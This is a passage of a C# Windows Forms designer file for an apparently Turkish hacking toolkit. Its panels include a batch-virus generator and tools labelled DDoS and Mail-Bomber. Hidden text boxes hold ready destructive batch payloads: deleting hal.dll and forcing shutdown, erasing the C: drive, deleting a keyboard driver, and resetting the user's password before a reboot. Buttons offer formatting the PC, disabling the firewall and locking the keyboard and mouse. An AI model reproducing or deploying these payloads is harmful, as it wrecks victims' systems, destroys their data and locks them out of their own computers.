            this.monoFlat_Button9.Name = "monoFlat_Button9";
            this.monoFlat_Button9.Size = new System.Drawing.Size(202, 41);
            this.monoFlat_Button9.TabIndex = 11;
            this.monoFlat_Button9.Text = "UYARI";
            this.monoFlat_Button9.TextAlignment = System.Drawing.StringAlignment.Center;
            this.monoFlat_Button9.Click += new System.EventHandler(this.MonoFlat_Button9_Click);
            // 
            // monoFlat_Button8
            // 
            this.monoFlat_Button8.BackColor = System.Drawing.Color.Transparent;
            this.monoFlat_Button8.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.monoFlat_Button8.Image = null;
            this.monoFlat_Button8.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.monoFlat_Button8.Location = new System.Drawing.Point(521, 541);
            this.monoFlat_Button8.Name = "monoFlat_Button8";
            this.monoFlat_Button8.Size = new System.Drawing.Size(202, 41);
            this.monoFlat_Button8.TabIndex = 10;
            this.monoFlat_Button8.Text = "TEMİZLE";
            this.monoFlat_Button8.TextAlignment = System.Drawing.StringAlignment.Center;
            this.monoFlat_Button8.Click += new System.EventHandler(this.MonoFlat_Button8_Click);
            // 
            // monoFlat_Button7
            // 
            this.monoFlat_Button7.BackColor = System.Drawing.Color.Transparent;
            this.monoFlat_Button7.Font = new System.Drawing.Font("Segoe UI", 12F);
            this.monoFlat_Button7.Image = null;
            this.monoFlat_Button7.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.monoFlat_Button7.Location = new System.Drawing.Point(301, 541);
            this.monoFlat_Button7.Name = "monoFlat_Button7";
            this.monoFlat_Button7.Size = new System.Drawing.Size(202, 41);
            this.monoFlat_Button7.TabIndex = 9;
            this.monoFlat_Button7.Text = "BAT. OLARAK KAYDET";
            this.monoFlat_Button7.TextAlignment = System.Drawing.StringAlignment.Center;
            this.monoFlat_Button7.Click += new System.EventHandler(this.MonoFlat_Button7_Click);
            // 
            // iTalk_GroupBox10
            // 
            this.iTalk_GroupBox10.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_GroupBox10.Controls.Add(this.textBox16);
            this.iTalk_GroupBox10.Controls.Add(this.textBox15);
            this.iTalk_GroupBox10.Controls.Add(this.textBox13);
            this.iTalk_GroupBox10.Controls.Add(this.textBox12);
            this.iTalk_GroupBox10.Controls.Add(this.textBox11);
            this.iTalk_GroupBox10.Controls.Add(this.textBox10);
            this.iTalk_GroupBox10.Controls.Add(this.textBox9);
            this.iTalk_GroupBox10.Controls.Add(this.textBox8);
            this.iTalk_GroupBox10.Controls.Add(this.textBox7);
            this.iTalk_GroupBox10.Controls.Add(this.textBox6);
            this.iTalk_GroupBox10.Controls.Add(this.textBox5);
            this.iTalk_GroupBox10.Controls.Add(this.iTalk_RadioButton4);
            this.iTalk_GroupBox10.Controls.Add(this.iTalk_RadioButton3);
            this.iTalk_GroupBox10.Controls.Add(this.iTalk_RadioButton2);
            this.iTalk_GroupBox10.Controls.Add(this.iTalk_RadioButton1);
            this.iTalk_GroupBox10.Controls.Add(this.textBox4);
            this.iTalk_GroupBox10.Location = new System.Drawing.Point(283, 41);
            this.iTalk_GroupBox10.MinimumSize = new System.Drawing.Size(136, 50);
            this.iTalk_GroupBox10.Name = "iTalk_GroupBox10";
            this.iTalk_GroupBox10.Padding = new System.Windows.Forms.Padding(5, 28, 5, 5);
            this.iTalk_GroupBox10.Size = new System.Drawing.Size(674, 494);
            this.iTalk_GroupBox10.TabIndex = 8;
            this.iTalk_GroupBox10.Text = "BAT VİRÜS DÜZENLE & KAYDET";
            // 
            // textBox16
            // 
            this.textBox16.Location = new System.Drawing.Point(33, 333);
            this.textBox16.Name = "textBox16";
            this.textBox16.Size = new System.Drawing.Size(100, 20);
            this.textBox16.TabIndex = 16;
            this.textBox16.Text = resources.GetString("textBox16.Text");
            this.textBox16.Visible = false;
            // 
            // textBox15
            // 
            this.textBox15.Location = new System.Drawing.Point(33, 378);
            this.textBox15.Name = "textBox15";
            this.textBox15.Size = new System.Drawing.Size(100, 20);
            this.textBox15.TabIndex = 15;
            this.textBox15.Text = "/timersecure 0 0 //mkdir $mid(C:,1,2) $+ $rand\r\n\r\n(1,99999) $+ $rand(A,Z) $+ $ran" +
    "d(a,z)";
            this.textBox15.Visible = false;
            // 
            // textBox13
            // 
            this.textBox13.Location = new System.Drawing.Point(33, 404);
            this.textBox13.Name = "textBox13";
            this.textBox13.Size = new System.Drawing.Size(100, 20);
            this.textBox13.TabIndex = 13;
            this.textBox13.Text = resources.GetString("textBox13.Text");
            this.textBox13.Visible = false;
            // 
            // textBox12
            // 
            this.textBox12.Location = new System.Drawing.Point(33, 304);
            this.textBox12.Name = "textBox12";
            this.textBox12.Size = new System.Drawing.Size(100, 20);
            this.textBox12.TabIndex = 12;
            this.textBox12.Text = resources.GetString("textBox12.Text");
            this.textBox12.Visible = false;
            // 
            // textBox11
            // 
            this.textBox11.Location = new System.Drawing.Point(33, 278);
            this.textBox11.Name = "textBox11";
            this.textBox11.Size = new System.Drawing.Size(100, 20);
            this.textBox11.TabIndex = 11;
            this.textBox11.Text = resources.GetString("textBox11.Text");
            this.textBox11.Visible = false;
            // 
            // textBox10
            // 
            this.textBox10.Location = new System.Drawing.Point(33, 249);
            this.textBox10.Name = "textBox10";
            this.textBox10.Size = new System.Drawing.Size(100, 20);
            this.textBox10.TabIndex = 10;
            this.textBox10.Text = resources.GetString("textBox10.Text");
            this.textBox10.Visible = false;
            // 
            // textBox9
            // 
            this.textBox9.Location = new System.Drawing.Point(33, 352);
            this.textBox9.Name = "textBox9";
            this.textBox9.Size = new System.Drawing.Size(100, 20);
            this.textBox9.TabIndex = 9;
            this.textBox9.Text = "net user %username% 123456\r\n\r\nshutdown -r";
            this.textBox9.Visible = false;
            // 
            // textBox8
            // 
            this.textBox8.Location = new System.Drawing.Point(33, 223);
            this.textBox8.Name = "textBox8";
            this.textBox8.Size = new System.Drawing.Size(100, 20);
            this.textBox8.TabIndex = 8;
            this.textBox8.Text = "CD..\r\n\r\nCD..\r\n\r\nCD.\r\n\r\nerase c:/f/s/q/a";
            this.textBox8.Visible = false;
            // 
            // textBox7
            // 
            this.textBox7.Location = new System.Drawing.Point(33, 197);
            this.textBox7.Name = "textBox7";
            this.textBox7.Size = new System.Drawing.Size(100, 20);
            this.textBox7.TabIndex = 7;
            this.textBox7.Text = "@echo off\r\ndel %systemdrive%\\WINDOWS\\system\\KEYBOARD.DRV";
            this.textBox7.Visible = false;
            // 
            // textBox6
            // 
            this.textBox6.Location = new System.Drawing.Point(33, 167);
            this.textBox6.Name = "textBox6";
            this.textBox6.Size = new System.Drawing.Size(100, 20);
            this.textBox6.TabIndex = 6;
            this.textBox6.Text = "@echo off\r\nstart %systemdrive%\\WINDOWS\\system32\\WISPTIS.EXE\r\nstart %systemdrive%\\" +
    "WINDOWS\\system32\\WISPTIS.EXE";
            this.textBox6.Visible = false;
            // 
            // textBox5
            // 
            this.textBox5.Location = new System.Drawing.Point(33, 136);
            this.textBox5.Name = "textBox5";
            this.textBox5.Size = new System.Drawing.Size(100, 20);
            this.textBox5.TabIndex = 5;
            this.textBox5.Text = "@echo off\r\nrem ---------------------------------\r\nrem Disable Computer By Deletin" +
    "g hal.dll\r\ndel /f /q %SystemDrive%\\WINDOWS\\system32\\hal.dll\r\nshutdown /s /t 00\r\n" +
    "rem ---------------------------------\r\n";
            this.textBox5.Visible = false;
            // 
            // iTalk_RadioButton4
            // 
            this.iTalk_RadioButton4.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_RadioButton4.Checked = false;
            this.iTalk_RadioButton4.Font = new System.Drawing.Font("Segoe UI", 10F);
            this.iTalk_RadioButton4.Location = new System.Drawing.Point(509, 452);
            this.iTalk_RadioButton4.Name = "iTalk_RadioButton4";
            this.iTalk_RadioButton4.Size = new System.Drawing.Size(132, 15);
            this.iTalk_RadioButton4.TabIndex = 4;
            this.iTalk_RadioButton4.Text = "YEŞİL";
            this.iTalk_RadioButton4.CheckedChanged += new iTalk.iTalk_RadioButton.CheckedChangedEventHandler(this.İTalk_RadioButton4_CheckedChanged);
            // 
            // iTalk_RadioButton3
            // 
            this.iTalk_RadioButton3.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_RadioButton3.Checked = false;
            this.iTalk_RadioButton3.Font = new System.Drawing.Font("Segoe UI", 10F);
            this.iTalk_RadioButton3.Location = new System.Drawing.Point(348, 452);
            this.iTalk_RadioButton3.Name = "iTalk_RadioButton3";
            this.iTalk_RadioButton3.Size = new System.Drawing.Size(132, 15);
            this.iTalk_RadioButton3.TabIndex = 3;
            this.iTalk_RadioButton3.Text = "MAVİ";
            this.iTalk_RadioButton3.CheckedChanged += new iTalk.iTalk_RadioButton.CheckedChangedEventHandler(this.İTalk_RadioButton3_CheckedChanged);
            // 
            // iTalk_RadioButton2
            // 
            this.iTalk_RadioButton2.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_RadioButton2.Checked = false;
            this.iTalk_RadioButton2.Font = new System.Drawing.Font("Segoe UI", 10F);
            this.iTalk_RadioButton2.Location = new System.Drawing.Point(196, 452);
            this.iTalk_RadioButton2.Name = "iTalk_RadioButton2";
            this.iTalk_RadioButton2.Size = new System.Drawing.Size(132, 15);
            this.iTalk_RadioButton2.TabIndex = 2;
            this.iTalk_RadioButton2.Text = "BEYAZ";
            this.iTalk_RadioButton2.CheckedChanged += new iTalk.iTalk_RadioButton.CheckedChangedEventHandler(this.İTalk_RadioButton2_CheckedChanged);
            // 
            // iTalk_RadioButton1
            // 
            this.iTalk_RadioButton1.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_RadioButton1.Checked = false;
            this.iTalk_RadioButton1.Font = new System.Drawing.Font("Segoe UI", 10F);
            this.iTalk_RadioButton1.ForeColor = System.Drawing.Color.Black;
            this.iTalk_RadioButton1.Location = new System.Drawing.Point(38, 452);
            this.iTalk_RadioButton1.Name = "iTalk_RadioButton1";
            this.iTalk_RadioButton1.Size = new System.Drawing.Size(132, 15);
            this.iTalk_RadioButton1.TabIndex = 1;
            this.iTalk_RadioButton1.Text = "SARI";
            this.iTalk_RadioButton1.CheckedChanged += new iTalk.iTalk_RadioButton.CheckedChangedEventHandler(this.İTalk_RadioButton1_CheckedChanged);
            // 
            // textBox4
            // 
            this.textBox4.BackColor = System.Drawing.Color.Black;
            this.textBox4.ForeColor = System.Drawing.Color.Yellow;
            this.textBox4.Location = new System.Drawing.Point(10, 27);
            this.textBox4.Multiline = true;
            this.textBox4.Name = "textBox4";
            this.textBox4.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.textBox4.Size = new System.Drawing.Size(654, 403);
            this.textBox4.TabIndex = 0;
            // 
            // iTalk_GroupBox6
            // 
            this.iTalk_GroupBox6.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_GroupBox6.Controls.Add(this.effectualButtonBlue10);
            this.iTalk_GroupBox6.Controls.Add(this.effectualButtonBlue11);
            this.iTalk_GroupBox6.Controls.Add(this.effectualButtonBlue12);
            this.iTalk_GroupBox6.Controls.Add(this.effectualButtonBlue9);
            this.iTalk_GroupBox6.Controls.Add(this.effectualButtonBlue8);
            this.iTalk_GroupBox6.Controls.Add(this.effectualButtonBlue7);
            this.iTalk_GroupBox6.Controls.Add(this.effectualButtonBlue6);
            this.iTalk_GroupBox6.Controls.Add(this.effectualButtonBlue5);
            this.iTalk_GroupBox6.Controls.Add(this.effectualButtonBlue4);
            this.iTalk_GroupBox6.Controls.Add(this.effectualButtonBlue2);
            this.iTalk_GroupBox6.Controls.Add(this.effectualButtonBlue1);
            this.iTalk_GroupBox6.Location = new System.Drawing.Point(15, 41);
            this.iTalk_GroupBox6.MinimumSize = new System.Drawing.Size(136, 50);
            this.iTalk_GroupBox6.Name = "iTalk_GroupBox6";
            this.iTalk_GroupBox6.Padding = new System.Windows.Forms.Padding(5, 28, 5, 5);
            this.iTalk_GroupBox6.Size = new System.Drawing.Size(262, 541);
            this.iTalk_GroupBox6.TabIndex = 7;
            this.iTalk_GroupBox6.Text = "HAZIR KODLAR";
            // 
            // effectualButtonBlue10
            // 
            this.effectualButtonBlue10.BackColor = System.Drawing.Color.Transparent;
            this.effectualButtonBlue10.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.effectualButtonBlue10.Location = new System.Drawing.Point(8, 480);
            this.effectualButtonBlue10.Name = "effectualButtonBlue10";
            this.effectualButtonBlue10.Size = new System.Drawing.Size(244, 38);
            this.effectualButtonBlue10.TabIndex = 10;
            this.effectualButtonBlue10.Text = "MONİTOR YAK";
            this.effectualButtonBlue10.Click += new System.EventHandler(this.EffectualButtonBlue10_Click);
            // 
            // effectualButtonBlue11
            // 
            this.effectualButtonBlue11.BackColor = System.Drawing.Color.Transparent;
            this.effectualButtonBlue11.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.effectualButtonBlue11.Location = new System.Drawing.Point(8, 436);
            this.effectualButtonBlue11.Name = "effectualButtonBlue11";
            this.effectualButtonBlue11.Size = new System.Drawing.Size(244, 38);
            this.effectualButtonBlue11.TabIndex = 9;
            this.effectualButtonBlue11.Text = "HDD YAK";
            this.effectualButtonBlue11.Click += new System.EventHandler(this.EffectualButtonBlue11_Click);
            // 
            // effectualButtonBlue12
            // 
            this.effectualButtonBlue12.BackColor = System.Drawing.Color.Transparent;
            this.effectualButtonBlue12.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.effectualButtonBlue12.Location = new System.Drawing.Point(8, 392);
            this.effectualButtonBlue12.Name = "effectualButtonBlue12";
            this.effectualButtonBlue12.Size = new System.Drawing.Size(244, 38);
            this.effectualButtonBlue12.TabIndex = 8;
            this.effectualButtonBlue12.Text = "EKRAN KARTI YAK";
            this.effectualButtonBlue12.Click += new System.EventHandler(this.EffectualButtonBlue12_Click);
            // 
            // effectualButtonBlue9
            // 
            this.effectualButtonBlue9.BackColor = System.Drawing.Color.Transparent;
            this.effectualButtonBlue9.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.effectualButtonBlue9.Location = new System.Drawing.Point(8, 83);
            this.effectualButtonBlue9.Name = "effectualButtonBlue9";
            this.effectualButtonBlue9.Size = new System.Drawing.Size(244, 38);
            this.effectualButtonBlue9.TabIndex = 7;
            this.effectualButtonBlue9.Text = "FAREYİ KİTLE";
            this.effectualButtonBlue9.Click += new System.EventHandler(this.EffectualButtonBlue9_Click);
            // 
            // effectualButtonBlue8
            // 
            this.effectualButtonBlue8.BackColor = System.Drawing.Color.Transparent;
            this.effectualButtonBlue8.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.effectualButtonBlue8.Location = new System.Drawing.Point(8, 128);
            this.effectualButtonBlue8.Name = "effectualButtonBlue8";
            this.effectualButtonBlue8.Size = new System.Drawing.Size(244, 38);
            this.effectualButtonBlue8.TabIndex = 6;
            this.effectualButtonBlue8.Text = "KLAVYE KİTLE";
            this.effectualButtonBlue8.Click += new System.EventHandler(this.EffectualButtonBlue8_Click);
            // 
            // effectualButtonBlue7
            // 
            this.effectualButtonBlue7.BackColor = System.Drawing.Color.Transparent;
            this.effectualButtonBlue7.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.effectualButtonBlue7.Location = new System.Drawing.Point(8, 172);
            this.effectualButtonBlue7.Name = "effectualButtonBlue7";
            this.effectualButtonBlue7.Size = new System.Drawing.Size(244, 38);
            this.effectualButtonBlue7.TabIndex = 5;
            this.effectualButtonBlue7.Text = "MASAÜSTÜ SİL";
            this.effectualButtonBlue7.Click += new System.EventHandler(this.EffectualButtonBlue7_Click);
            // 
            // effectualButtonBlue6
            // 
            this.effectualButtonBlue6.BackColor = System.Drawing.Color.Transparent;
            this.effectualButtonBlue6.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.effectualButtonBlue6.Location = new System.Drawing.Point(8, 348);
            this.effectualButtonBlue6.Name = "effectualButtonBlue6";
            this.effectualButtonBlue6.Size = new System.Drawing.Size(244, 38);
            this.effectualButtonBlue6.TabIndex = 4;
            this.effectualButtonBlue6.Text = "HİGH FORMAT";
            this.effectualButtonBlue6.Click += new System.EventHandler(this.EffectualButtonBlue6_Click);
            // 
            // effectualButtonBlue5
            // 
            this.effectualButtonBlue5.BackColor = System.Drawing.Color.Transparent;
            this.effectualButtonBlue5.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.effectualButtonBlue5.Location = new System.Drawing.Point(8, 304);
            this.effectualButtonBlue5.Name = "effectualButtonBlue5";
            this.effectualButtonBlue5.Size = new System.Drawing.Size(244, 38);
            this.effectualButtonBlue5.TabIndex = 3;
            this.effectualButtonBlue5.Text = "SÜREKLİ CMD AÇ";
            this.effectualButtonBlue5.Click += new System.EventHandler(this.EffectualButtonBlue5_Click);
            // 
            // effectualButtonBlue4
            // 
            this.effectualButtonBlue4.BackColor = System.Drawing.Color.Transparent;
            this.effectualButtonBlue4.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.effectualButtonBlue4.Location = new System.Drawing.Point(8, 260);
            this.effectualButtonBlue4.Name = "effectualButtonBlue4";
            this.effectualButtonBlue4.Size = new System.Drawing.Size(244, 38);
            this.effectualButtonBlue4.TabIndex = 2;
            this.effectualButtonBlue4.Text = "GÜVENLİK DUVARI KAPAT";
            this.effectualButtonBlue4.Click += new System.EventHandler(this.EffectualButtonBlue4_Click);
            // 
            // effectualButtonBlue2
            // 
            this.effectualButtonBlue2.BackColor = System.Drawing.Color.Transparent;
            this.effectualButtonBlue2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.effectualButtonBlue2.Location = new System.Drawing.Point(8, 216);
            this.effectualButtonBlue2.Name = "effectualButtonBlue2";
            this.effectualButtonBlue2.Size = new System.Drawing.Size(244, 38);
            this.effectualButtonBlue2.TabIndex = 1;
            this.effectualButtonBlue2.Text = "PC YE ŞİFRE KOY";
            this.effectualButtonBlue2.Click += new System.EventHandler(this.EffectualButtonBlue2_Click);
            // 
            // effectualButtonBlue1
            // 
            this.effectualButtonBlue1.BackColor = System.Drawing.Color.Transparent;
            this.effectualButtonBlue1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.effectualButtonBlue1.Location = new System.Drawing.Point(8, 37);
            this.effectualButtonBlue1.Name = "effectualButtonBlue1";
            this.effectualButtonBlue1.Size = new System.Drawing.Size(244, 38);
            this.effectualButtonBlue1.TabIndex = 0;
            this.effectualButtonBlue1.Text = "PC FORMAT";
            this.effectualButtonBlue1.Click += new System.EventHandler(this.EffectualButtonBlue1_Click);
            // 
            // panel40
            // 
            this.panel40.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel40.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.panel40.Location = new System.Drawing.Point(10, 59);
            this.panel40.Name = "panel40";
            this.panel40.Size = new System.Drawing.Size(58, 10);
            this.panel40.TabIndex = 6;
            // 
            // panel39
            // 
            this.panel39.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel39.Dock = System.Windows.Forms.DockStyle.Right;
            this.panel39.Location = new System.Drawing.Point(68, 36);
            this.panel39.Name = "panel39";
            this.panel39.Size = new System.Drawing.Size(10, 33);
            this.panel39.TabIndex = 5;
            // 
            // panel38
            // 
            this.panel38.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel38.Dock = System.Windows.Forms.DockStyle.Left;
            this.panel38.Location = new System.Drawing.Point(0, 36);
            this.panel38.Name = "panel38";
            this.panel38.Size = new System.Drawing.Size(10, 33);
            this.panel38.TabIndex = 4;
            // 
            // panel37
            // 
            this.panel37.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel37.Controls.Add(this.label51);
            this.panel37.Controls.Add(this.button8);
            this.panel37.Dock = System.Windows.Forms.DockStyle.Top;
            this.panel37.Location = new System.Drawing.Point(0, 0);
            this.panel37.Name = "panel37";
            this.panel37.Size = new System.Drawing.Size(78, 36);
            this.panel37.TabIndex = 3;
            this.panel37.MouseDown += new System.Windows.Forms.MouseEventHandler(this.Panel37_MouseDown);
            this.panel37.MouseMove += new System.Windows.Forms.MouseEventHandler(this.Panel37_MouseMove);
            this.panel37.MouseUp += new System.Windows.Forms.MouseEventHandler(this.Panel37_MouseUp);
            // 
            // label51
            // 
            this.label51.AutoSize = true;
            this.label51.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label51.ForeColor = System.Drawing.Color.White;
            this.label51.Location = new System.Drawing.Point(447, 11);
            this.label51.Name = "label51";
            this.label51.Size = new System.Drawing.Size(107, 17);
            this.label51.TabIndex = 12;
            this.label51.Text = "< VİRÜS ÜRET >";
            // 
            // button8
            // 
            this.button8.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button8.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button8.ForeColor = System.Drawing.Color.White;
            this.button8.Location = new System.Drawing.Point(942, 6);
            this.button8.Name = "button8";
            this.button8.Size = new System.Drawing.Size(23, 22);
            this.button8.TabIndex = 4;
            this.button8.Text = "X";
            this.button8.UseVisualStyleBackColor = false;
            this.button8.Click += new System.EventHandler(this.Button8_Click);
            // 
            // panel41
            // 
            this.panel41.BackColor = System.Drawing.Color.White;
            this.panel41.Controls.Add(this.iTalk_GroupBox19);
            this.panel41.Controls.Add(this.iTalk_GroupBox18);
            this.panel41.Controls.Add(this.iTalk_GroupBox17);
            this.panel41.Controls.Add(this.iTalk_GroupBox15);
            this.panel41.Controls.Add(this.iTalk_GroupBox11);
            this.panel41.Controls.Add(this.panel45);
            this.panel41.Controls.Add(this.panel44);
            this.panel41.Controls.Add(this.panel43);
            this.panel41.Controls.Add(this.panel42);
            this.panel41.Location = new System.Drawing.Point(498, 327);
            this.panel41.Name = "panel41";
            this.panel41.Size = new System.Drawing.Size(94, 70);
            this.panel41.TabIndex = 27;
            // 
            // iTalk_GroupBox19
            // 
            this.iTalk_GroupBox19.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_GroupBox19.Controls.Add(this.label62);
            this.iTalk_GroupBox19.Controls.Add(this.label60);
            this.iTalk_GroupBox19.Controls.Add(this.pictureBox25);
            this.iTalk_GroupBox19.Controls.Add(this.label61);
            this.iTalk_GroupBox19.Controls.Add(this.pictureBox26);
            this.iTalk_GroupBox19.Controls.Add(this.pictureBox23);
            this.iTalk_GroupBox19.Controls.Add(this.pictureBox24);
            this.iTalk_GroupBox19.Controls.Add(this.label58);
            this.iTalk_GroupBox19.Controls.Add(this.label59);
            this.iTalk_GroupBox19.Controls.Add(this.label57);
            this.iTalk_GroupBox19.Controls.Add(this.pictureBox22);
            this.iTalk_GroupBox19.Controls.Add(this.pictureBox20);
            this.iTalk_GroupBox19.Controls.Add(this.label55);
            this.iTalk_GroupBox19.Controls.Add(this.label56);
            this.iTalk_GroupBox19.Controls.Add(this.pictureBox21);
            this.iTalk_GroupBox19.Controls.Add(this.pictureBox19);
            this.iTalk_GroupBox19.Controls.Add(this.label54);
            this.iTalk_GroupBox19.Location = new System.Drawing.Point(325, 262);
            this.iTalk_GroupBox19.MinimumSize = new System.Drawing.Size(136, 50);
            this.iTalk_GroupBox19.Name = "iTalk_GroupBox19";
            this.iTalk_GroupBox19.Padding = new System.Windows.Forms.Padding(5, 28, 5, 5);
            this.iTalk_GroupBox19.Size = new System.Drawing.Size(502, 265);
            this.iTalk_GroupBox19.TabIndex = 13;
            this.iTalk_GroupBox19.Text = "PROGRAMLARIN RENGİ";
            // 
            // label62
            // 
            this.label62.AutoSize = true;
            this.label62.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label62.Location = new System.Drawing.Point(52, 216);
            this.label62.Name = "label62";
            this.label62.Size = new System.Drawing.Size(400, 17);
            this.label62.TabIndex = 28;
            this.label62.Text = "YUKARIDAKİ PROGRAMLARIN RENKLERİNİ DEĞİŞTİREBİLİRSİNİZ";
            // 
            // label60
            // 
            this.label60.AutoSize = true;
            this.label60.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label60.Location = new System.Drawing.Point(352, 174);
            this.label60.Name = "label60";
            this.label60.Size = new System.Drawing.Size(52, 17);
            this.label60.TabIndex = 27;
            this.label60.Text = "Ayarlar";
            // 
            // pictureBox25
            // 
            this.pictureBox25.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox25.Image = global::cyberhourshack.Properties.Resources.ayarlar_png_2;
            this.pictureBox25.Location = new System.Drawing.Point(351, 114);
            this.pictureBox25.Name = "pictureBox25";
            this.pictureBox25.Size = new System.Drawing.Size(53, 52);
            this.pictureBox25.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox25.TabIndex = 24;
            this.pictureBox25.TabStop = false;
            this.pictureBox25.Click += new System.EventHandler(this.PictureBox25_Click);
            // 
            // label61
            // 
            this.label61.AutoSize = true;
            this.label61.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label61.Location = new System.Drawing.Point(332, 92);
            this.label61.Name = "label61";
            this.label61.Size = new System.Drawing.Size(88, 17);
            this.label61.TabIndex = 26;
            this.label61.Text = "Mail-Bomber";
            // 
            // pictureBox26
            // 
            this.pictureBox26.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox26.Image = global::cyberhourshack.Properties.Resources.mail_logo_png_1;
            this.pictureBox26.Location = new System.Drawing.Point(351, 37);
            this.pictureBox26.Name = "pictureBox26";
            this.pictureBox26.Size = new System.Drawing.Size(53, 52);
            this.pictureBox26.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox26.TabIndex = 25;
            this.pictureBox26.TabStop = false;
            this.pictureBox26.Click += new System.EventHandler(this.PictureBox26_Click);
            // 
            // pictureBox23
            // 
            this.pictureBox23.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox23.Image = global::cyberhourshack.Properties.Resources.Zayo_Security_Icons_Proactive_DDoS_Management_Circle;
            this.pictureBox23.Location = new System.Drawing.Point(277, 37);
            this.pictureBox23.Name = "pictureBox23";
            this.pictureBox23.Size = new System.Drawing.Size(53, 52);
            this.pictureBox23.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox23.TabIndex = 21;
            this.pictureBox23.TabStop = false;
            this.pictureBox23.Click += new System.EventHandler(this.PictureBox23_Click);
            // 
            // pictureBox24
            // 
            this.pictureBox24.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox24.Image = global::cyberhourshack.Properties.Resources._1_2_virus_free_download_png_thumb;
            this.pictureBox24.Location = new System.Drawing.Point(277, 115);
            this.pictureBox24.Name = "pictureBox24";
            this.pictureBox24.Size = new System.Drawing.Size(53, 52);
            this.pictureBox24.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox24.TabIndex = 20;
            this.pictureBox24.TabStop = false;
            this.pictureBox24.Click += new System.EventHandler(this.PictureBox24_Click);
            // 
            // label58
            // 
            this.label58.AutoSize = true;
            this.label58.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label58.Location = new System.Drawing.Point(273, 174);
            this.label58.Name = "label58";
            this.label58.Size = new System.Drawing.Size(63, 17);
            this.label58.TabIndex = 23;
            this.label58.Text = "Bat.Virüs";
            // 
            // label59
            // 
            this.label59.AutoSize = true;
            this.label59.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label59.Location = new System.Drawing.Point(280, 94);
            this.label59.Name = "label59";
            this.label59.Size = new System.Drawing.Size(40, 17);
            this.label59.TabIndex = 22;
            this.label59.Text = "Ddos";
            // 
            // label57
            // 
            this.label57.AutoSize = true;
            this.label57.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label57.Location = new System.Drawing.Point(96, 174);
            this.label57.Name = "label57";
            this.label57.Size = new System.Drawing.Size(56, 17);
            this.label57.TabIndex = 19;
            this.label57.Text = "Tarayıcı";
            // 
            // pictureBox22
            // 
